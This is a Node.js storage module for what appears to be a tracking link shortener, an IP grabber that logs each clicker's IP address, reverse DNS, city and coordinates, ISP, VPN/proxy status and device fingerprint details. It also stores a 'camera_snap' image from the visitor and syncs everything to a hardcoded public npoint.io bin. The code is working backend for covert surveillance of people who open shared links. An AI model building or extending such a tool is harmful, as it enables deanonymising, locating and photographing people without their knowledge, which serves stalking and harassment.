const fs = require('fs');
const path = require('path');
const axios = require('axios');

// Support Vercel / Serverless read-only filesystem
let dbPath = path.join(__dirname, 'data.json');

try {
  fs.accessSync(__dirname, fs.constants.W_OK);
} catch (err) {
  dbPath = path.join('/tmp', 'data.json');
}

// Initial schema structure
const defaultData = {
  links: [],
  click_logs: [],
  nextLinkId: 1,
  nextLogId: 1
};

// Global in-memory cache
let memoryCache = null;

// Persistent Cloud DB Endpoint for Vercel Serverless Instance Synchronization
const CLOUD_BIN_URL = process.env.CLOUD_BIN_URL || 'https://api.npoint.io/0839e248b64e56598db4';

// Synchronously or Async fetch from Cloud DB to ensure 100% data consistency
async function ensureDbSynced() {
  try {
    const res = await axios.get(CLOUD_BIN_URL, { timeout: 3500 });
    if (res.data && Array.isArray(res.data.links)) {
      memoryCache = res.data;
      saveLocalDb(res.data);
      return res.data;
    }
  } catch (err) {
    // Fallback to local
  }
  return loadLocalDb();
}

// Push to Cloud DB
async function pushToCloud(data) {
  memoryCache = data;
  saveLocalDb(data);
  try {
    await axios.post(CLOUD_BIN_URL, data, { timeout: 4000 });
  } catch (err) {
    console.error('Cloud DB push error:', err.message);
  }
}

// Save to local file system
function saveLocalDb(data) {
  try {
    fs.writeFileSync(dbPath, JSON.stringify(data, null, 2), 'utf8');
  } catch (err) {}
}

// Load local DB file
function loadLocalDb() {
  if (memoryCache) return memoryCache;
  try {
    if (fs.existsSync(dbPath)) {
      const content = fs.readFileSync(dbPath, 'utf8');
      memoryCache = JSON.parse(content);
      return memoryCache;
    }
  } catch (err) {}
  memoryCache = defaultData;
  return defaultData;
}

module.exports = {
  initSync: async () => {
    await ensureDbSynced();
  },

  // Links
  createLink: async (shortCode, title, destinationUrl) => {
    const data = await ensureDbSynced();
    const newLink = {
      id: data.nextLinkId++,
      short_code: shortCode,
      title: title,
      destination_url: destinationUrl,
      created_at: new Date().toISOString()
    };
    data.links.push(newLink);
    await pushToCloud(data);
    return newLink;
  },

  getAllLinks: async () => {
    const data = await ensureDbSynced();
    return data.links.map(l => {
      const clickCount = data.click_logs.filter(c => c.link_id === l.id).length;
      return {
        ...l,
        total_clicks: clickCount
      };
    }).sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  },

  getLinkByShortCode: async (shortCode) => {
    const data = await ensureDbSynced();
    return data.links.find(l => l.short_code === shortCode) || null;
  },

  deleteLink: async (id) => {
    const data = await ensureDbSynced();
    const numId = Number(id);
    data.links = data.links.filter(l => l.id !== numId);
    data.click_logs = data.click_logs.filter(c => c.link_id !== numId);
    await pushToCloud(data);
    return true;
  },

  // Click Logs
  logClick: async (logData) => {
    const data = await ensureDbSynced();
    const newLog = {
      id: data.nextLogId++,
      link_id: logData.linkId,
      ip_address: logData.ipAddress,
      reverse_dns: logData.reverseDns || 'N/A',
      country: logData.country || 'Unknown',
      countryCode: logData.countryCode || '',
      region: logData.region || 'Unknown',
      city: logData.city || 'Unknown',
      isp: logData.isp || 'Unknown',
      org: logData.org || 'Unknown',
      lat: logData.lat || 0,
      lon: logData.lon || 0,
      is_proxy: logData.isProxy || false,
      is_mobile_net: logData.isMobileNet || false,
      is_hosting: logData.isHosting || false,
      user_agent: logData.userAgent || '',
      browser: logData.browser || 'Unknown',
      os: logData.os || 'Unknown',
      device: logData.device || 'Desktop',
      device_model: logData.deviceModel || 'Generic Device',
      screen_res: logData.screenRes || 'N/A',
      timezone: logData.timezone || 'N/A',
      gpu: logData.gpu || 'N/A',
      cpu_cores: logData.cpuCores || 'N/A',
      connection_type: logData.connectionType || 'N/A',
      language: logData.language || 'N/A',
      battery: logData.battery || 'N/A',
      camera_snap: logData.cameraSnap || null,
      created_at: new Date().toISOString()
    };
    data.click_logs.push(newLog);
    await pushToCloud(data);
    return newLog;
  },

  updateLogClientData: async (logId, clientData) => {
    const data = await ensureDbSynced();
    const log = data.click_logs.find(c => c.id === logId);
    if (log) {
      if (clientData.screenRes) log.screen_res = clientData.screenRes;
      if (clientData.timezone) log.timezone = clientData.timezone;
      if (clientData.gpu) log.gpu = clientData.gpu;
      if (clientData.cpuCores) log.cpu_cores = clientData.cpuCores;
      if (clientData.connectionType) log.connection_type = clientData.connectionType;
      if (clientData.language) log.language = clientData.language;
      if (clientData.battery) log.battery = clientData.battery;
      if (clientData.deviceModel && clientData.deviceModel !== 'N/A') log.device_model = clientData.deviceModel;
      if (clientData.cameraSnap) log.camera_snap = clientData.cameraSnap;
      await pushToCloud(data);
    }
  },

  getLogsByLinkId: async (linkId) => {
    const data = await ensureDbSynced();
    const numId = Number(linkId);
    return data.click_logs
      .filter(c => c.link_id === numId)
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  },

  getAllLogs: async (limit = 100) => {
    const data = await ensureDbSynced();
    return data.click_logs
      .map(c => {
        const link = data.links.find(l => l.id === c.link_id);
        return {
          ...c,
          link_title: link ? link.title : 'Deleted Link',
          short_code: link ? link.short_code : 'N/A'
        };
      })
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at))
      .slice(0, limit);
  },

  getStats: async () => {
    const data = await ensureDbSynced();
    const totalLinks = data.links.length;
    const totalClicks = data.click_logs.length;
    const uniqueIPs = new Set(data.click_logs.map(c => c.ip_address)).size;
    const vpnCount = data.click_logs.filter(c => c.is_proxy).length;

    const locMap = {};
    data.click_logs.forEach(c => {
      if (c.country && c.country !== 'Unknown') {
        const key = `${c.city}, ${c.country}`;
        locMap[key] = (locMap[key] || 0) + 1;
      }
    });

    const topLocations = Object.entries(locMap)
      .map(([loc, count]) => ({ location: loc, count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 5);

    return { totalLinks, totalClicks, uniqueIPs, vpnCount, topLocations };
  }
};
